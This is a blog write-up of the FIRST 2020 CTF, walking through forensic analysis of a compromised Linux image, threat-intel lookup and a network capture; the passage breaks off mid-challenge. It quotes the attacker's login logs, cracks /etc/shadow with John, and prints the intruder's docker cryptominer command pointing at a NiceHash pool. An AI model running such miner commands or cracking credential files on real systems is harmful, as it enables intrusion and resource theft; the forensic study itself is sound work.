---
title: Writeup: FIRST 2020 CTF Challenge
url: https://fareedfauzi.github.io/2020/06/26/FIRST-CTF.html
source: Over Security
date: 2026-11-02
fetch_date: 2026-11-03T08:51:33.171610
---

# Writeup: FIRST 2020 CTF Challenge

xml version="1.0" standalone="no"?

[root@fareed:~#](/ "Personal blog for research, education and note purpose.
")

* [Cheatsheets](/cheatsheets.html)
* [Archive](/archive.html)
* [About](/about.html)

# Writeup: FIRST 2020 CTF Challenge

* [DFIR](/archive.html?tag=DFIR)
* [Writeup](/archive.html?tag=Writeup)

* Jun 26, 2020

Hey. A CTF online competition organized by U.S. Department of Homeland Security’s (DHS) Cybersecurity & Infrastructure Security Agency (CISA) was ended yesterday (27/6).

This post will going through all challenges that my team solved. Let’s go.

Tools used:

1. FTK Imager
2. Linux terminal
3. Online tools
4. Wireshark

# Forensics

For this category, organizer gave us a `.dd` file of compromised linux machine named `hacked.dd`. Challenges 1-7 will be use this dd image to answer all the questions (flag).

Open up the .dd file in FTK Imager will help us a lot to go through this category.

### Challenge 1

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/1.png)

To monitor system logins, one of the important file we should monitor is `auth.log` reside in `/var/log`. As you can see in FTK imager ss below:

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/2020-06-26-10-42-24.png)

We then dump the `auth.log` into our local machine, and start analyse it with our text editor (vs code) :p

As we see below, there’s a lot (ton) of attempts to login but failed from IP `45.62.224.162`. It may a bruteforce attack was launched by the attacker.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/2020-06-26-10-44-43.png)

Scrolling down little bit, and we can see that the attacker successfully get into the machine.

```
Mar 10 06:55:01 dockersrv sshd[1997]: Accepted password for jdoe from 45.62.224.162 port 37488 ssh2
Mar 10 06:55:01 dockersrv sshd[1997]: pam_unix(sshd:session): session opened for user jdoe by (uid=0)
Mar 10 06:55:01 dockersrv systemd: pam_unix(systemd-user:session): session opened for user jdoe by (uid=0)
Mar 10 06:55:01 dockersrv systemd-logind[803]: New session 3 of user jdoe.
Mar 10 06:55:51 dockersrv sudo:     jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/su -
Mar 10 06:55:51 dockersrv sudo: pam_unix(sudo:session): session opened for user root by jdoe(uid=0)
Mar 10 06:55:51 dockersrv su[2105]: Successful su for root by root
Mar 10 06:55:51 dockersrv su[2105]: + /dev/pts/0 root:root
Mar 10 06:55:51 dockersrv su[2105]: pam_unix(su:session): session opened for user root by jdoe(uid=0)
Mar 10 06:55:51 dockersrv su[2105]: pam_systemd(su:session): Cannot create session: Already running in a session
Mar 10 06:56:05 dockersrv groupadd[2122]: group added to /etc/group: name=hack3rman, GID=1001
Mar 10 06:56:05 dockersrv groupadd[2122]: group added to /etc/gshadow: name=hack3rman
Mar 10 06:56:05 dockersrv groupadd[2122]: new group: name=hack3rman, GID=1001
Mar 10 06:56:05 dockersrv useradd[2126]: new user: name=hack3rman, UID=1001, GID=1001, home=/home/hack3rman, shell=/bin/bash
Mar 10 06:56:21 dockersrv passwd[2134]: pam_unix(passwd:chauthtok): password changed for hack3rman
Mar 10 06:56:26 dockersrv chfn[2135]: changed user 'hack3rman' informatio
```

It start to create user `hack3rman` and do his “things” after that.

Flag: `45.62.224.162`

### Challenge 2

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/2.png)

As we see in the `auth.log`, sshd service accepted password from user `jdoe` from attacker IP (`45.62.224.162`) is on `Mar 10 06:55:01`.

Flag: `Mar 10 06:55:01`

### Challenge 3

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/3.png)

The use that has been compromised was `jdoe`

Flag: `jdoe`

### Challenge 4

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/4.png)

So, the organizer ask us to retrieve `jdoe` password.

To crack `jdoe`’s password, we need to take `/etc/shadow` file and crack it with `John`.

So, we dumped `/etc/shadow` to our local machine and start crack the hash using John in my Kali terminal bash in Windows.

```
$ john shadow
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/2020-06-26-10-59-50.png)

User `jdoe` use an easy password for his account, therefore the process to crack and bruteforce will be fast and easy!

Flag: `123456`

### Challenge 5

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/5.png)

As we monitored the log, we’ve seen that the attacker created a user named `hack3rman`.

Flag: `hack3rman`

### Challenge 6

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/6.png)

Now, we need to retrive the command used by attacker to make his profit in our `hacked` server. We can found history of commands used by user (unless user deleted it) in `/home/<user>/.bash_history`. The `.bash_history` file tracks a user’s command history and is an important artifact in Linux and Mac forensics. Suspects may attempt anti-forensic techniques to corrupt or remove `.bash_history` content. In our case, the attacker is not remove this important files. Therefore, we can track it’s command.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/2020-06-26-11-06-33.png)

As we see, the attacker try to run a crypto-miner in the compromised server.

Flag: `sudo docker service create --name miner alexellis2/cpu-opt:2018-1-2 ./cpuminer -a hodl -o stratum+tcp://hodl.eu.nicehash.com:3352 -u 35THoNiL8vNCESSq5ZPmZYTHT1GymWvUAx.autopsit.org`

# Threat Intel

### Challenge 1

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/Bonus.png)

Now we already know the IP (45.62.224.162). Let’s use online tools to investigate the hoster name and it’s country. I’ll this [website](https://check-host.net/) to define the hosting and the country.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Forensic%20and%20intel/2020-06-26-11-14-48.png)

Flag: `cloudatcost/canada`

# Network Forensic

### Challenge 1

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Network%20forensics/1.png)

Run the pcap file in Wireshark and we can see the IP.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Network%20forensics/2020-06-26-11-22-46.png)

Flag: `172.16.100.223`

### Challenge 2

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Network%20forensics/2.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Network%20forensics/2020-06-26-11-22-46.png)

Flag: `172.16.100.1`

### Challenge 3

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/first%20lounge%20challenges/Network%20forensics/3.png)

The organizer ask us about ...